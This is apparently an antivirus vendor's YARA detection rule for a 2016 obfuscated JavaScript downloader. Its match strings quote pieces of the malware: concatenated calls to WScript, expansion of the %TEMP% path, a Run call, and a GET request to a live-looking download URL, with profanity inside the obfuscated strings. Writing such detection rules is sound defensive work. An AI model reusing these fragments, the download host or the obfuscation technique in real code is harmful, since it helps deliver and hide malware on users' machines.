rule sig_20160428_2e2b890a5b52bb96769422bde0bcf306 {
  meta:
    description = "datamaliciousorder - file 20160428_2e2b890a5b52bb96769422bde0bcf306.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6e856863b5a3ba2f50f03a055b07e5938ccfb0d1ecb1c8a5da6997c30821542c"

  strings:
    $s1  = "function CoqRkxSolZjcRswBszKpc() {return ReiLyrUcwTjqNvfTjoTvg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function HzkCzuOeeIhhCwwVisIai(OfuDemIkyLipQgoYisTmo){ReiLyrUcwTjqNvfTjoTvg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function HzkCzuOeeIhhCwwVisIai(OfuDemIkyLipQgoYisTmo){ReiLyrUcwTjqNvfTjoTvg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return YnyOpsSqxZxxCfwTgfSiy - KbsCneIdhNezFahQqbBhf;};" fullword ascii
    $s5  = "function PgkVbiKhwDvnNrhZieCdr(YnyOpsSqxZxxCfwTgfSiy, KbsCneIdhNezFahQqbBhf){FexCzgLvdBdlMocIjcWqt = FexCzgLvdBdlMocIjcWqt * 1; " ascii
    $s6  = "var ReiLyrUcwTjqNvfTjoTvg = function HksHrbIgjBzeSxnIljJgt() {return WhoSwrMdgBseJigCtaUcb[PpwRfsXcnEreKyyVcwTbv](\"WScript\"+\"" ascii
    $s7  = "TcjMtyQiwRntAykLieOzd[YwpJqyNskWtkVowNkdKon](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s8  = "function CoqRkxSolZjcRswBszKpc() {return ReiLyrUcwTjqNvfTjoTvg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "var ReiLyrUcwTjqNvfTjoTvg = function HksHrbIgjBzeSxnIljJgt() {return WhoSwrMdgBseJigCtaUcb[PpwRfsXcnEreKyyVcwTbv](\"WScript\"+\"" ascii
    $s10 = "var WhoSwrMdgBseJigCtaUcb = this[\"WScript\"];" fullword ascii
    $s11 = "function KxpDojScvHstRbtUrwOfc(){return FuyWfvVwoBpvHvlRxnVtx + \"\";};" fullword ascii
    $s12 = "if (TcjMtyQiwRntAykLieOzd[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function PgkVbiKhwDvnNrhZieCdr(YnyOpsSqxZxxCfwTgfSiy, KbsCneIdhNezFahQqbBhf){FexCzgLvdBdlMocIjcWqt = FexCzgLvdBdlMocIjcWqt * 1; " ascii
    $s14 = "function LfcYvqBplXgjAthYltIaa() {return ((FwuQfhQqaRyyPngNfyWyf == true) && (FwuQfhQqaRyyPngNfyWyf == YicBooAioKlfDmpEjySqn)) ?" ascii
    $s15 = "function LfcYvqBplXgjAthYltIaa() {return ((FwuQfhQqaRyyPngNfyWyf == true) && (FwuQfhQqaRyyPngNfyWyf == YicBooAioKlfDmpEjySqn)) ?" ascii
    $s16 = "}while (CrdIoiApuZnrJjaHdtClv);" fullword ascii
    $s17 = "function GyoVtmZeuYqlPpnVtyIxm()" fullword ascii
    $s18 = "return PgkVbiKhwDvnNrhZieCdr(1 == 1 ? KskMczLgsUojLgiToaRrm : 0, 1 == 1 ? WvgFnnPhgJevXkxGgqJtx : 0);" fullword ascii
    $s19 = "YicBooAioKlfDmpEjySqn = true; " fullword ascii
    $s20 = "var KhtJttHkkGxqBgfTwmTsk = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}